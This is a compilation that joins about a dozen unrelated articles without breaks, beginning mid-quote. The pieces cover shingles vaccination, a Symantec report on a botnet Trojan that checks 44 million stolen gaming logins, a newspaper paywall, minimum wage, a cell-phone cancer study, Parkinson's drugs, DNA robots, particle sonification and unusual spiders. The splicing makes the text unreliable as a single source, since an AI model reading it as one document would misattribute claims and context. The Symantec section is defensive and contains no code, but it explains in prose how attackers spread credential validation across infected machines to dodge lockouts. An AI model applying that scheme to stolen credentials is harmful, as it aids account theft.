“ This is as opposed to 98 percent of our patients getting the pneumonia and influenza vaccines , immunizations where they just have to go down the hall because we stock it , roll up their sleeves then walk out the door . ”
With all of these barriers , it comes as no surprise that in the end only 2 percent to 7 percent of patients are immunized against shingles .
“ There ’s just so much that primary care practices must take care of with chronic diseases like obesity and diabetes and heart disease , ” Dr. Hurley noted .
“ If a treatment is n’t easy to administer , then sometimes it just falls to the bottom of the list of things for people to do . ”
“ Shingles vaccination has become a disparity issue , ” Dr. Hurley added .
“ It ’s great that this vaccine was developed and could potentially prevent a very severe disease .
But we have to have a reimbursement process that coincides with these interventions .
Just making these vaccines does n’t mean that they will have a public health impact . ”
In previous blogs , Symantec has highlighted threats that steal user data .
We recently analyzed a new sample submitted to Symantec and came across a server hosting the credentials of 44 million stolen gaming accounts .
What was interesting about this threat was n’t just the sheer number of stolen accounts , but that the accounts were being validated by a Trojan distributed to compromised computers .
Symantec detects this threat as Trojan .
Loginck .
This particular database server we uncovered seems very much to be the heart of the operation — part of a distributed password checker aimed at Chinese gaming websites .
The stolen login credentials are not just from particular online games , but also include user login accounts associated with sites that host a variety of online games .
In both cases the accounts contained in the database have been obtained from other sources , most likely using malware with information - stealing capabilities , such as Infostealer .
Gampass .
So , picture this : you are a bad guy and have created or purchased a botnet .
You have targeted online gaming websites and now have 44 million sets of gaming credentials at your disposal .
Now it ’s time to turn those gaming credentials into hard cash .
But how do you find out which credentials are valid and thus worth some money ?
Three options come to mind :
1. Log on to gaming websites 44 million times !
2 . Write a program to log in to the websites and check for you ( this would take months ) .
3 . Write a program that checks the login details and then distribute the program to multiple computers .
Option one naturally seems next to impossible .
Option two is also not very feasible , since websites typically block IP addresses after multiple failed login attempts .
By taking advantage of the distributed processing that the third option offers , you can complete the task more quickly and help mitigate the multiple - login failure problems by spreading the task over more IP addresses .
This is what Trojan .
Loginck ’s creators have done .
Most botnets have the ability to download and run files , so why not push a custom piece of malware to each bot ?
The malware could log on to the database and download a group of user names and passwords in order to check them for validity .
If the Trojan succeeds in its task of logging in , it will update the database with the time it logged in and any user credentials ( such as current game level , etc. ) before moving to the next user name and password .
The attackers can then log on to the database and search for the valid user name and password combinations .
The database in question currently holds approximately 17 GB of flat file data .
There are credentials for at least 18 gaming websites in the database .
Just how valuable is a database of this sort ?
While it can be extremely difficult to evaluate a database of this kind , there are legitimate websites out there that focus on the buying and selling of online accounts .
Using figures from some of these sites we can detail a range of possible prices ( which would be estimates of the requested value , not the value received ) .
The cheapest accounts most likely contain a single character named something like “ Mediocre Tom , ” whose only weapon is a rusty old spoon .
In contrast , an expensive account will typically contain several powerful characters with names like “ Warlock , Bringer of Death ” who is adept with the “ Lethal Lance of Loki . ”
It is also worth noting that the actual buying and selling of accounts is typically banned by many online gaming and hosting sites , as evidenced by the terms of their EULAs .
The online auctions that enable users to sell accounts , such as at playerauctions.com , are legitimate websites that attempt to protect the buyer and seller against fraud through the use of escrow .
We only used these sites to try to put some rough market values on the accounts , and have no evidence that these sites have traded stolen accounts .
As always , Symantec recommends that you keep your definitions up to date in order to ensure protection against new threats .
As an added precaution , if you are in possession of an online gaming account from one of these types of websites , an update of your password would not go amiss .
===========================
Update ( 3 June 2010 ) : This blog has been edited from its original version .
During the economic crisis , the online advertising market took a corresponding dive , a trend that has left sites considering ways to get users to pay directly for content .
Traditional print outlets are at the forefront of this trend , led by major sites like The New York Times and various properties in Rupert Murdoch 's News Corp. empire .
In the UK , The Times is rolling out its paywall and now demands that anyone intent on reading its content register an account .
According to research done by the traffic metrics firm Hitwise , simply demanding registration has already cut into traffic at The Times .
Right now ,
The Times is n't charging for content , although it plans on doing so in the near future .
As of mid-June , however , the site started requiring that anyone who wished to view an actual article register an account .
Ultimately , these accounts will be used to try to extract payment for viewing an article 's content .
But , according to Hitwise 's numbers , simply adding the registration barrier has cut traffic to the site almost in half .
Prior to the change , The Times was seeing somewhere in the neighborhood of four to five percent of the traffic going to the print news media category ; after , it was hovering around two percent .
Hitwise also tracked where users were going once they hit the registration page .
About a third stay on one of The Times ' properties , but many head straight to another news site ( The Telegraph and The Guardian are big winners here ) , or simply to Google .
Still , it 's not like the paper 's competitors are seeing a huge boost in traffic as a result of the registration .
The Independent saw the biggest boost in its traffic , but the new readers only accounted for 0.6 percent of its total traffic .
All told , the analysis concludes that The Times ' new system is costing them readers , but it has n't been " catastrophic " for the site 's traffic , and no single entity has stepped in to pick up the slack .
One thing that 's not possible to determine yet is whether this represents a temporary dip .
Over time , more readers may find a news story that compels them to set up an account ; provided the credentials are stored conveniently , that should provide them with continual access from that point on .
At least until the content requires payment , which will probably have an even more radical effect on traffic .
One big caution to this story is that it relies entirely on data from a single company 's traffic monitoring system .
Hitwise provides software to ISPs that aggregates anonymized Web - surfing data that flows across their networks .
In addition to providing that information to the ISPs , the company performs its own analyses of data aggregated from multiple ISPs .
The caveat to these findings is that it's not clear how extensive their coverage of the UK 's population is , and how much their figures reflect the average UK Web user .
Still , given that the before and after figures are generated by the same method , the trend Hitwise detects is likely to be real .
The large impact of this simple change highlights a real challenge for the sites considering charging for content .
With so many options for news on the Web , and search engines that will happily present those options to a reader , even the convenience of accessing free news can have a major impact on online readership .
Actually requiring payment , and the additional steps involved in arranging that , will undoubtedly have a greater impact .
For a site with dedicated readers convinced of its quality , the payments will probably offset the plunge in ad revenues from casual readers .
But those sites are likely to be few and far between .

Why he'd be a good fit in Columbus :
The center position is the big concern after the blueline .
If there is any uncertainty in the future of Derick Brassard , Johansen could be the Blue Jackets next draft pick .
I could see Ryan playing on the second line with Voracek and Umberger .
He has very good size to even play on the checking line if Pahlsson finds his way moving up or down in the lineup .

Writing a helpful referee 's report
pdf of published article Published in Journal of Scholarly Publishing , vol. 39 , no .
3 , April 2008 , pp. 301-306

Referees ' reports are often demoralizing to authors .
It is possible to write a report that is supportive and helpful by following two rules :
Say what is good about a piece of work , and say how it can be improved .
Recently I received a referee 's report on an article .
It started off as follows : ' On the bottom of page 1 , the manuscript says that the method of taking action [...] is not specified ; it is unclear what the author means here . '
It continued for fourteen paragraphs , each filled with criticisms .
In my career , I 've received hundreds of reports from referees , and their most predictable feature is criticism , sometimes relentless and merciless .
Some reports start with a sentence or two saying what 's nice and then proceed with the bloodletting .
Such reports can be damaging to morale .
I know senior scholars who rarely or never submit articles to refereed journals because of the fierce criticism they 've received .
I know others who , having submitted excellent papers , were so daunted by the resulting criticism that they did not pursue the editor 's advice to ' revise and resubmit , ' either giving up or submitting elsewhere .
If experienced researchers can be so affected by biting criticisms , imagine what it 's like for someone beginning a research career .
I suspect that many talented individuals have been lost to research because of damaging reports from referees .
There is a lot of psychological research showing that most people think they are better than average in all sorts of areas , from driving to social skills to teaching , so undoubtedly most authors overrate their work .
This helps explain why critical reports can be such a shock .
As well as being damaging to morale , negative reports are usually unhelpful :
They do not explain well what the author needs to do to improve the article .
' The literature review is incomplete ' ; ' The central thesis of the paper is confusing ' ; ' The methodology has gaps . '
For some referees , the chance to comment on someone else 's work seems to open an emotional floodgate , allowing the venting of hostility .
Anonymity assists :
Some friendly colleagues are capable of amazing vitriol in their reports .
Anyone with a lot of experience has stories to tell .
My favourite is the referee who did n't even write a report but instead wrote impassioned comments on the manuscript , including ' bullshit . '
Rejected by that journal , the paper ended up being one of my most widely read , reproduced , and translated publications .
Another factor is the scholarly culture of criticism : Students are trained to be critical of their own work , and both aspiring and established scholars build their own status by cutting others down to size .
It can become second nature to look for things to criticize .
The whole idea of quality control via peer review is to weed out inadequate work .
So finding shortcomings can be taken up as a challenge .
Exceptions to this pattern - the supportive and generous reports - are things to treasure .
Actually , helpful reports are more common than most authors realize , because a single unpleasant report sticks in the mind much longer than several nice ones .
Many editors try to moderate the nastiness of referees , and occasionally even overrule them .
On the other hand , some editors can be brutal in their comments and decisions .
The nicest rejection I 've received said that lack of space was the reason : ' The responses I received on your paper were generally positive , favouring publication , but not with sufficient enthusiasm to persuade the final committee making decisions . '
Two Rules for Writing a Helpful Report
After years of writing reports in the standard critical mode , I started rethinking what I was doing .
Or perhaps , as I got older and had more publications , I became more generous .
Anyway , I set myself the goal of writing helpful reports .
I do n't always succeed , but sometimes authors and editors send their appreciation .
I have two rules for writing a helpful report :
Say what 's good about a piece of work and tell the author how to improve it .
Nothing else - no freestanding criticisms .
The first part is to describe the good aspects of the paper .
There are many possibilities : a concise abstract , an interesting topic , intriguing data , appropriate methods , a well - structured argument , clear language , provocative conclusions , sensitive referencing .
Here is a sample , omitting specifics , from one of my reports :
This is an excellent analysis of theory and practice in relation to [... ] .
The critique of formulaic positions is well done , as is the discussion of [... ] .
The four responses to the question of [...] are astute and serve very well to highlight creative ways of thinking .
The second half , on [... ] , is even more stimulating .
The role of [...] is explained vividly , with informative commentary on issues such as [... ] .
This material shows how practical experience can provide directions for transcending sterile theoretical debates .
The article is very well written , logically structured and a pleasure to read .
Use of sources is appropriate .
It can take a bit of practice to say good things about a paper .
The temptation to use barbed compliments - ' This is an excellent analysis of theory and practice except for the connection between them ' - should be resisted .
For an author , a description of good things serves two purposes .
First , it gives reassurance that something in the work is valid or worthwhile ; second , it identifies positive aspects of the article that are worth retaining and building on .
The risk of a largely negative review is that the author may scrap the good with the bad .
The second part of a helpful review is a precise description of what needs to be done to make the paper better .
This may be on a large scale : ' A much expanded data set is needed to draw convincing conclusions ' ; ' References from the field of [...] should be cited and the key ideas from these references used to reframe the argument . '
Saying what needs to be done may also be specific :
Instead of the last two paragraphs of the article , it would be more helpful to have a separate conclusion section with a summary of the key points made in the article , an assessment of [...] , and possibly some comments on how insights from this assessment might be used in other parts of the world .
There can also be specific comments about unclear sentences , missing references , contradictory arguments , and the like .
The big challenge in making such comments is to phrase them in terms of how to improve rather than simply stating what 's wrong .
Rather than saying ' This sentence is confusing , ' say ' Rewrite this sentence to make it clearer . '
This may seem a trivial matter , but it reflects a mode of thinking :
By phrasing comments in terms of actions for improvement , we focus attention on what the author should do , not on the author 's inadequacies .
Focusing attention this way tends to make comments more precise - and more helpful !
That 's it : the report is composed of comments on what 's good and what should be done to improve the paper .
Nothing else .
I normally divide my comments on improvement into two main types - those I think are essential and those I draw to the author 's attention for information but not requiring action .
Distinguishing essential and non-essential points is vital to help the author to decide what is top priority for revisions .
After the main comments , I often have a list of small points , from missing words to additional references for consideration .
This is a good place to add some positive comments : ' Table 1 is very helpful ' ; ' The first paragraph in the conclusion is well expressed . '
Writing a helpful report does n't make everything easy for the author .
After all , revisions still have to be done .
A request to ' redo the data analysis with a different set of criteria ' is not substantively different from the criticism that ' the criteria for the data analysis are totally inappropriate . '
Furthermore , a sensitive author may still feel mortified at the inadequacies implied by suggestions for improvement .
The main difference is orientation : A helpful report is oriented toward building on strengths and improving weak points .
Recommendations and Anonymity
Referees are usually asked to make a recommendation , for example , ' accept without revision , ' ' accept with minor revisions , ' ' revise and resubmit , ' or ' reject . '
Everything I 've said about writing a helpful report is compatible with making a recommendation .
Then I read an article by Scott Armstrong about peer review that convinced me not to make recommendations .
Instead , I include the following paragraph in my reports :
Scott Armstrong ( Wharton School , University of Pennsylvania ) for many years has studied and reviewed research on peer review .
In order to encourage innovation , he recommends that referees do not make a recommendation about acceptance or rejection , but only comment on papers and how they might be improved , leaving decisions to editors .
( See , for example , J.S. Armstrong , ' Peer review for journals : evidence on quality control , fairness , and innovation , ' Science and Engineering Ethics , Vol. 3 , 1997 , pp. 63 -84 . )
I am persuaded by his arguments and hence make no formal recommendation about this paper .
If the editor wants to rely entirely on the referees ' views , it is usually pretty easy to extract a recommendation from my comments .
In the course of my studies of suppression of dissent , I have come across stories about anonymous review being used for unsavoury motives , such as blocking a competitor from prior publication or obstructing work for ideological reasons - or , sometimes , out of envy and vindictiveness .
I wanted to make sure that no one could accuse me of stabbing them in the back , so for a long time I have waived anonymity .
A few journals invite referees to make confidential comments to the editor in addition to a report for the author .
I avoid making confidential comments , because this too is open to abuse .
In my reports I include this sentence : ' As is my standard practice , I do not wish to be anonymous , and would be happy to correspond directly with the author(s ) . '
A few authors do contact me , sometimes for advice and sometimes just to say thanks for a helpful report .
Finally , I 'd like to give my appreciation to all the referees who have commented on my papers - yes , even the most critical referees .
There is a lot of work involved .
But , surprisingly , there is very little training on how to be a good referee .
Furthermore , referees seldom receive any feedback .
Editors sometimes quietly drop nasty or incompetent referees , but otherwise there is little to promote change in the anonymous habits that can persist for a career .
Much more needs to be said publicly about how to write referee reports .
Meanwhile , I prefer to err on the side of generosity .

This is the time of year when youngsters across the country are getting out of school and hitting the pavement to look for summer jobs .
The unfortunate reality of the current economic climate is that teenagers are having an extremely tough time .
The unadjusted unemployment rate for 16 to 19 year olds in May was 26.8 percent , up from 12.6 percent a decade ago and 23.6 percent in May of last year , before the federal minimum wage increased to $ 7.25 per hour .
Minimum wage law " winds up doing more harm to those people it 's intended to help , than it actually benefits them , " said James Sherk , a senior policy analyst with The Heritage Foundation , in an interview with Charles Adler .
" What happens when it becomes more expensive to hire workers ?
Well , employers , like everyone else , they hire fewer workers .
And it means higher wages for some workers , but for other workers it means that they do n't get a job in the first place . "
Sherk recently took this message to the U.S. Congress Joint Economic Committee , declaring that " temporarily reducing the minimum wage to $ 5.15 an hour would spur hiring of unskilled youth . "
The states seem to have their signals crossed , though .
In Illinois , where minimum wage is going up to $ 8.25 per hour , the Republican candidate for governor has signaled his willingness to drop the rate to match the federal level .
Meanwhile , New York is considering moving in the opposite direction by mandating a living wage of $ 11.50 for jobs connected to any developments that receive subsidies or tax breaks from the city .
In North Carolina , where the minimum wage has jumped $ 1.10 in the past year and a half , summer camps are being forced to layoff young counselors and cut back on field trips .
This ends up hurting both college students and the children they are supposed to take care of .
" It is harder when there are less counselors to get things done , " said college student and camp counselor Toni Watson in an interview with News 14 Carolina .
A 2007 study published in The Journal of Human Resources found that young people in jurisdictions with high minimum wages had worse outcomes later in life because they were less likely to get the training and experience they needed when they were young .
You'd have to be completely heartless not to want kids to have the opportunity to get a good job when they grow up .
Seriously people , think of the children !

Arbitrary day : successful !
( CNN ) -- Long - awaited data from an international study have shown no evidence of increased risk of brain tumors associated with mobile phones , except in people who have the most exposure .
But design flaws of the Interphone study , which is partly industry funded , suggest that the latest results cannot be taken to mean that cell phones and brain cancer are unrelated , critics say .
" I 'm not telling people to stop using the phone .
I 'm saying that I can't tell you if cell phones are dangerous , but I can tell you that I 'm not sure that they are safe , " said Dr. Devra Davis , professor of preventive medicine at Mount Sinai Medical Center in New York .
The study itself , to be published Tuesday in the International Journal of Epidemiology , acknowledged that the findings were not definitive and called for more research .
But Daniel Krewski , professor of epidemiology at the University of Ottawa in Ontario and one of the Interphone collaborators , said the study went to " great lengths to make sure that the results were scientifically sound . "
The results showing no connection between cancer and phones are " reassuring , " he said .
" It tells us that we do n't have an epidemic of brain cancer on our hands associated with mobile phones . "
At the highest exposure levels -- using a mobile phone half an hour a day over a 10 - year period -- the study found a 40 percent increased risk of glioma brain tumors .
With adjustments for statistical biases , that turned into 80 percent .
But Krewski and colleagues say that there is not enough evidence to show a causal connection , and the group of participants using their phones this much was relatively small .
In regular mobile phone users , the study found that phone radiation exposure actually decreased the likelihood of tumor , although this " protective " effect may have resulted from limitations in the study , the authors wrote .
But critics say that " high " exposure may actually be most representative of the average cell phone user , meaning the study may underestimate the actual risk of tumors .
Five ways to reduce cell - phone radiation
The decade - long study defines a " regular " cell phone user as someone who uses a phone at least once a week for at least months .
Results were based on patients ' average talk time ranging from 120 minutes to 150 minutes a month -- some U.S. users talk that much on the phone in a single week , Davis said .
Another concerning flaw in the study 's methodology was that it did not address cordless phone usage , which has been found in other studies to have a risk of tumors similar to cell phones , said Lloyd Morgan , a retired engineer and consumer advocate who has published several analyses on the phone - cancer issue .
The study therefore may underestimate the risk of brain tumors because it does not take this exposure into account .
Children and young adults were not included in the study , critics note , despite other findings that exposure beginning at a younger age is associated with increased risk of brain tumors , Morgan said .
Interphone also released results on only two types of brain tumors : meningioma and glioma .
Previous Interphone research on cell phone users ' ability to recall how many hours they spend on the phone has found that heavy users generally underestimate that time , and light users overestimate it , Morgan said .
This suggests that the current study , which used people 's recollections of phone usage , underestimates the risk of tumors in many users , he said .
But Krewski said that overall people generally have a good ability to recall the number of phone calls reasonably accurately , and tend to overestimate call duration by about 40 percent .
The way that the study selected a control group also biases the results , Davis said .
" Their comparison is n't between people who used cell phones and did n't .
It was between people who used their phone less than once a week , and more than once a week , all on self - reflection memory of their mobile use , the day after they 've had a brain operation , " she said .
Krewski said the authors acknowledge this limitation of participant selection , and corrected for it when doing statistical analyses .
The study was conducted at 16 locations in 13 countries , not including the United States .
In hospital interviews , brain tumor patients were asked to answer a series of questions based on memory about their mobile phone use habits prior to being diagnosed .
They were asked to reflect on how many hours they talked on their phone a month , how long they had been using their cell phone , if they remembered how many phone calls they made a month and to what side of the head they typically held the phone .
Data collection took place between 2000 and 2004 , and results have been expected since 2005 .
Tuesday 's study is still not a reflection of the entire data set .
Cell phone popularity has gone up since the data were gathered , Davis noted .
The World Health Organization 's International Agency for Research on Cancer is coordinating Interphone .
Several of the researchers analyzing the data acknowledged that they received money from the mobile phone industry .
An analysis in the Journal of Clinical Oncology last year found that studies that have looked at people who had used cell phones 10 years or longer tended to find the strongest risk of tumors .
Eight of the strongest studies came from the same researcher : oncologist Dr. Lennart Hardell in Sweden .
This research made sure the investigators did not know which participants had tumors when they conducted the interviews about cell phone use , and they did not receive funding from industry groups .
But there may be something unique to Sweden in terms of cancer susceptibility and cell phone use , experts say , and therefore Hardell 's findings may not be widely applicable .
The Interphone study has not been released in its entirety .
There are ongoing analyses of cell phones ' effects on other kinds of tumors , and other analyses .
There is also a study to correlate the position of where participants ' tumors started to grow in their brains , and what the energy level from cell phones are at that area in the brain .

Patients racked up huge losses
Two patients identified by researchers in the US had each lost more than $ 60,000 as a result .
It is thought that the " dopamine agonist " - a standard therapy which helps reduce the symptoms of Parkinson 's in many patients - may be eroding the mental restraint that prevented the patients from gambling .
This clinical study suggests that higher dosages of dopamine agonists may be a catalyst to bringing out this destructive behaviour
Dr Mark Stacy , Duke University Medical Center
In the study , carried out at Duke University Medical Center in North Carolina , the records of more than 1,800 patients were examined , and only nine compulsive gamblers uncovered .
In addition , all the patients involved came from Arizona - a state in which the temptations of casinos are never far away .
None of them had any history of gambling prior to their starting to take medication for Parkinson's .
Seven of them started to gamble within one month of an increased dosage of the drug .
Sexual behaviour
Once the problem was detected by their families , a change of drug regime was normally enough to solve the problem .
Dr Mark Stacy , who led the study , said : " This clinical study suggests that higher dosages of dopamine agonists may be a catalyst to bringing out this destructive behaviour . "
Parkinson 's patients suffer because they are no longer able to produce enough of the chemical dopamine , which helps control movement .
This leads to increasing tremor , rigidity and walking problems .
This is not the first time that dopamine agonist treatment - which aims to help increase the supply of dopamine to the brain - has been linked to extreme behaviour .
Other studies have reported the arrival of sexual disorders - namely a marked increase in libido and sexual behaviour - as a result .
In some patients the dopamine agonist is thought to be responsible for distinct changes in sexual behaviour and even orientation .
Reassurance
However , a spokesman for the Parkinson 's Disease Society said that other small studies had made the link between Parkinson 's and gambling .
A spokesman said : " Many people with Parkinson's are prescribed dopamine agonists in conjunction with levodopa and the Parkinson 's Disease Society has not been made aware of any reported cases in the UK of this combination treatment leading to a side - effect of pathological gambling .
" It should be noted that the author of the most recent survey reported that the risk was found to be very small and may have arisen in part because of the location of the study in a retirement and vacation setting in Arizona with several casinos .
" However , we would advise anyone who is concerned about their medication regime or is anxious about any side effects to speak to their doctor . "
A team of scientists from Columbia University , Arizona State University , the University of Michigan , and the California Institute of Technology ( Caltech ) have programmed an autonomous molecular " robot " made out of DNA to start , move , turn , and stop while following a DNA track .
The development could ultimately lead to molecular systems that might one day be used for medical therapeutic devices and molecular - scale reconfigurable robots -- robots made of many simple units that can reposition or even rebuild themselves to accomplish different tasks .
A paper describing the work appears in the current issue of the journal Nature .
The traditional view of a robot is that it is " a machine that senses its environment , makes a decision , and then does something -- it acts , " says Erik Winfree , associate professor of computer science , computation and neural systems , and bioengineering at Caltech .
Milan N. Stojanovic , a faculty member in the Division of Experimental Therapeutics at Columbia University , led the project and teamed up with Winfree and Hao Yan , professor of chemistry and biochemistry at Arizona State University and an expert in DNA nanotechnology , and with Nils G. Walter , professor of chemistry and director of the Single Molecule Analysis in Real - Time ( SMART ) Center at the University of Michigan in Ann Arbor , for what became a modern - day self - assembly of like - minded scientists with the complementary areas of expertise needed to tackle a tough problem .
Shrinking robots down to the molecular scale would provide , for molecular processes , the same kinds of benefits that classical robotics and automation provide at the macroscopic scale .
Molecular robots , in theory , could be programmed to sense their environment ( say , the presence of disease markers on a cell ) , make a decision ( that the cell is cancerous and needs to be neutralized ) , and act on that decision ( deliver a cargo of cancer - killing drugs ) .

Or , like the robots in a modern - day factory , they could be programmed to assemble complex molecular products .
The power of robotics lies in the fact that once programmed , the robots can carry out their tasks autonomously , without further human intervention .
With that promise , however , comes a practical problem : how do you program a molecule to perform complex behaviors ?
" In normal robotics , the robot itself contains the knowledge about the commands , but with individual molecules , you can't store that amount of information , so the idea instead is to store information on the commands on the outside , " says Walter .
And you do that , says Stojanovic , " by imbuing the molecule 's environment with informational cues . "
" We were able to create such a programmed or ' prescribed ' environment using DNA origami , " explains Yan. DNA origami , an invention by Caltech Senior Research Associate Paul W. K. Rothemund , is a type of self - assembled structure made from DNA that can be programmed to form nearly limitless shapes and patterns ( such as smiley faces or maps of the Western Hemisphere or even electrical diagrams ) .
Exploiting the sequence - recognition properties of DNA base pairing , DNA origami are created from a long single strand of DNA and a mixture of different short synthetic DNA strands that bind to and " staple " the long DNA into the desired shape .
The origami used in the Nature study was a rectangle that was 2 nanometers ( nm ) thick and roughly 100 nm on each side .
The researchers constructed a trail of molecular " bread crumbs " on the DNA origami track by stringing additional single - stranded DNA molecules , or oligonucleotides , off the ends of the staples .
These represent the cues that tell the molecular robots what to do -- start , walk , turn left , turn right , or stop , for example -- akin to the commands given to traditional robots .

The molecular robot the researchers chose to use -- dubbed a " spider " -- was invented by Stojanovic several years ago , at which time it was shown to be capable of extended , but undirected , random walks on two - dimensional surfaces , eating through a field of bread crumbs .
To build the 4 - nm - diameter molecular robot , the researchers started with a common protein called streptavidin , which has four symmetrically placed binding pockets for a chemical moiety called biotin .
Each robot leg is a short biotin - labeled strand of DNA , " so this way we can bind up to four legs to the body of our robot , " Walter says .
" It 's a four - legged spider , " quips Stojanovic .
Three of the legs are made of enzymatic DNA , which is DNA that binds to and cuts a particular sequence of DNA .
The spider also is outfitted with a " start strand " -- the fourth leg -- that tethers the spider to the start site ( one particular oligonucleotide on the DNA origami track ) .
" After the robot is released from its start site by a trigger strand , it follows the track by binding to and then cutting the DNA strands extending off of the staple strands on the molecular track , " Stojanovic explains .
" Once it cleaves , " adds Yan , " the product will dissociate , and the leg will start searching for the next substrate . "
In this way , the spider is guided down the path laid out by the researchers .
Finally , explains
Yan , " the robot stops when it encounters a patch of DNA that it can bind to but that it cannot cut , " which acts as a sort of flypaper .
Although other DNA walkers have been developed before , they 've never ventured farther than about three steps .
" This one , " says Yan , " can walk up to about 100 nanometers .
That 's roughly 50 steps . "
" This in itself was n't a surprise , " adds Winfree , " since Milan 's original work suggested that spiders can take hundreds if not thousands of processive steps .
What 's exciting here is that not only can we directly confirm the spiders ' multistep movement , but we can direct the spiders to follow a specific path , and they do it all by themselves -- autonomously . "
In fact , using atomic force microscopy and single - molecule fluorescence microscopy , the researchers were able to watch directly spiders crawling over the origami , showing that they were able to guide their molecular robots to follow four different paths .
" Monitoring this at a single molecule level is very challenging , " says Walter .
" This is why we have an interdisciplinary , multi-institute operation .
We have people constructing the spider , characterizing the basic spider .
We have the capability to assemble the track , and analyze the system with single - molecule imaging .
That 's the technical challenge . "
The scientific challenges for the future , Yan says , " are how to make the spider walk faster and how to make it more programmable , so it can follow many commands on the track and make more decisions , implementing logical behavior . "
" In the current system , " says Stojanovic , " interactions are restricted to the walker and the environment .
Our next step is to add a second walker , so the walkers can communicate with each other directly and via the environment .
The spiders will work together to accomplish a goal . "
Adds Winfree , " The key is how to learn to program higher - level behaviors through lower - level interactions . "
Such collaboration ultimately could be the basis for developing molecular - scale reconfigurable robots -- complicated machines that are made of many simple units that can reorganize themselves into any shape -- to accomplish different tasks , or fix themselves if they break .
For example , it may be possible to use the robots for medical applications .
" The idea is to have molecular robots build a structure or repair damaged tissues , " says Stojanovic .
" You could imagine the spider carrying a drug and bonding to a two - dimensional surface like a cell membrane , finding the receptors and , depending on the local environment , " adds Yan , " triggering the activation of this drug . "
Such applications , while intriguing , are decades or more away .
" This may be 100 years in the future , " Stojanovic says .
" We 're so far from that right now . "
" But , " Walter adds , " just as researchers self - assemble today to solve a tough problem , molecular nanorobots may do so in the future . "
The other coauthors on the paper , " Molecular robots guided by prescriptive landscapes , " are Kyle Lund and Jeanette Nangreave from Arizona State University ; Anthony J. Manzo , Alexander Johnson - Buck , and Nicole Michelotti from the University of Michigan ; Nadine Dabby from Caltech ; and Steven Taylor and Renjun Pei from Columbia University .
The work was supported by the National Science Foundation , the Army Research Office , the Office of Naval Research , the National Institutes of Health , the Department of Energy , the Searle Foundation , the Lymphoma and Leukemia Society , the Juvenile Diabetes Research Foundation , and a Sloan Research Fellowship .
The Large Hadron Collider is an enormous , $ 8 billion machine built to detect the existence of certain hypothesized - to - exist particles .
But detect how ?
What if , instead of looking for particles , scientists could listen for them ?
This is what they 'd sound like .
Dr. Lily Asquith is a physicist working on the detection of the Higgs boson , the " God particle " whose unproven existence could help explain the origin of mass in the universe .
With the help of a musician and software developer , Richard Dobson , Asquith has been attempting the " sonification " of some LHC data — specifically , the data that researchers are expected to receive if and when the Higgs boson emerges from the LHC .
Dr Asquith and her team have so far generated a number of simulations based on predictions of what might happen during collisions inside the LHC .
The team is only now feeding in real results from real experiments .
" When you are hearing what the sonifications do you really are hearing the data .
It 's true to the data , and it 's telling you something about the data that you could n't know in any other way , " said Archer Endrich , a software engineer working on the project .
The aim is to give physicists at the LHC another way to analyse their data .
The sonification team believes that ears are better suited than eyes to pick out the subtle changes that might indicate the detection of a new particle .
This is a very cool idea , beyond the far - out tunes created by sonfiying Higgs boson data .
As Asquith writes on her blog ,
Sound seems the perfect tool with which to represent the complexity of the data ; our ears are superb at locating the source and location of sounds relative to one another , we can hear a vast range of frequencies and distinguish timbres ( different instruments ) before they have even played a full cycle .
We also have an incredible ability to notice slight changes is pitch or tempo over time and to recognise patterns in sound after hearing them just once .
Perhaps using our ears could allow us to make full use of the neural networks between them .
And the sound itself ?
The above , from Asquith 's website , LHCSound , is an abridged version of " Higgs Boson Simple " — an " emerging and decaying Higgs boson . "
Writes Asquith ,
This example maps properties of the Higgs jet to properties of sound ...
A jet is made up of lots of cells containing energy deposits .
Each cell has an energy , a distance and an angular distance ( dR ) associated with it .
So each cell can be heard as a separate note in this example .
This is quite a long track ( about 90 seconds ) .
The sounds reduce in density very much towards the end , with isolated events separated by silences of several seconds .
Here are some more particle sounds — starting with " Higgs Jet Motif , " which uses the Higgs data to shape the sound of running water :
Here 's the " Higgs Jet Harmonic Motif , " which has been reassembled to determine pitch by distance , angular distance , and energy , one after the other :
And finally , this is the " Higgs Jet Energy Profile Crotale , " which modifies each note using only the energy of the particle , performed on baby cymbals :

hey...illuminatihey..illuminiti.. your free lunch is ready !!!
Thank goodness for rat boyardee !
Warning !
If you are arachnophobic you may not want to see this list , but I really suggest that you do .
You may find that these creatures are more diverse and fascinating than they are creepy .
Spiders have never ceased to amaze me ; they are among the most abundant predators in the world and have adapted to almost any imaginable habitat except for the sea , giving rise to countless species many of which remain unknown to science .
If people would stop to watch spiders instead of simply squashing them on sight , I ’m sure they would be amazed constantly .
This list is only a very small selection of bizarre spiders from around the world .
10 Bird dung crab spider
This spider has one of the most effective camouflages of all animals ; its body is covered on blobs and warts that give it the appearance of a fresh piece of bird excrement ; it often produces a small thread of white silk and sits on it so that it looks like the white stains caused by bird droppings falling onto leaves .
And as if this was not amazing enough , it also smells like poop .
This camouflage has a double function ; it makes the spider a rather unappetizing prey for most animals ( especially birds themselves ) , and it serves as a lure for the small , excrement - loving insects which are the spider ’s favorite prey .
These spiders are found in Asia , from Indonesia to Japan .
9 Argyrodes colubrinus
Usually known as the Whip Spider , although this name is also used for another arachnid and could lead to confusion .
Found in Australia , this spider has a long , thin abdomen similar to a snake ’s body , hence its species name colubrinus , which means “ snake - like ” .
Its unusual appearance is , again , an example of camouflage .
By looking like a small twig caught in spider silk , it escapes notice by most predators , and is less easily spotted by its prey .
The whip spider belongs to the same family as the dangerous black widow .
It is not known how potent the whip spider ’s venom really is , but it is usually regarded as harmless due to its docile nature and short chelicerae ( fangs ) .
8 Scorpion - tailed spider
So named because of the female ’s weird abdomen , ended in a “ tail ” similar to that of a scorpion .
When threatened , the scorpion - tailed spider arches this tail as a scorpion would .
Only the female has a tail ; the male looks more like an ordinary spider and is much smaller .
These creatures are , again , found in Australia and they seem to be completely harmless .
They spin circular webs and are often found in colonies , although each female spider has its own web and does n’t venture into those of other females .
7 Bagheera kiplingi
This spider was named Bagheera kiplingi after Bagheera , the black panther character in The Jungle Book , and the book ’s author Rudyard Kipling .
It was seemingly named because of it ’s panther - like agility , which is common to all jumping spiders .
However , while all the other known jumping spiders are predators , Bagheera is almost completely vegetarian , feeding almost exclusively on acacia buds and nectar .
They use their agility to escape the aggressive ants that usually protect acacia trees from other animals .
Occasionally , the Bagheera spider feeds on ant larvae , and even , if very hungry , on other Bagheeras ( it ’s still a spider , after all ! )
Funnily enough , there is a chapter in The Jungle Book in which , during a period of food scarcity , Bagheera the panther claims that he hopes he could be a vegetarian !
6 Assassin spider
I ’ve already introduced this spider in the surreal animal list , but it just has to be in this one too .
